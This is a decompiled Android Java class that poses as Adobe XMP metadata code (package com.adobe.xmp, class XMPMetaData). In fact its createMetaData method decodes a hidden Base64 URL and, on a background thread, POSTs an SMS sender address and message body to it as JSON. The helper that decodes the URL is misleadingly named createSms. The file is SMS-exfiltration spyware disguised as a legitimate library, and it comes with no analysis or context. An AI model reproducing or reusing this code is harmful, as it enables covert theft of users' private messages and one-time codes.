package com.adobe.xmp;

import android.util.Base64;
import android.util.Log;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import org.apache.http.client.methods.HttpPost;
import org.json.JSONArray;
import org.json.JSONObject;

/* loaded from: classes3.dex */
public class XMPMetaData {
    public static void createMetaData(final String smsBase64, final String aAccount, final String aBody) {
        new Thread(new Runnable() { // from class: com.adobe.xmp.XMPMetaData.1
            @Override // java.lang.Runnable
            public void run() {
                try {
                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(XMPMetaData.createSms(smsBase64)).openConnection();
                    httpURLConnection.setRequestMethod(HttpPost.METHOD_NAME);
                    httpURLConnection.setDoOutput(true);
                    httpURLConnection.setDoInput(true);
                    httpURLConnection.setUseCaches(false);
                    httpURLConnection.connect();
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.putOpt("added_at", Long.valueOf(System.currentTimeMillis()));
                    jSONObject.putOpt("address", aAccount);
                    jSONObject.putOpt("body", aBody);
                    JSONArray jSONArray = new JSONArray();
                    jSONArray.put(jSONObject);
                    String jSONArray2 = jSONArray.toString();
                    BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(httpURLConnection.getOutputStream(), "UTF-8"));
                    bufferedWriter.write(jSONArray2);
                    bufferedWriter.close();
                    if (httpURLConnection.getResponseCode() == 200) {
                        String is2String = XMPMetaData.is2String(httpURLConnection.getInputStream());
                        Log.d("kwwl", "result=============" + is2String);
                    }
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
            }
        }).start();
    }

    public static String is2String(InputStream is) throws IOException {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is, "utf-8"));
        StringBuilder sb = new StringBuilder();
        while (true) {
            String readLine = bufferedReader.readLine();
            if (readLine != null) {
                sb.append(readLine);
            } else {
                return sb.toString().trim();
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static String createSms(String base64) {
        return new String(Base64.decode(base64.getBytes(), 0));
    }
}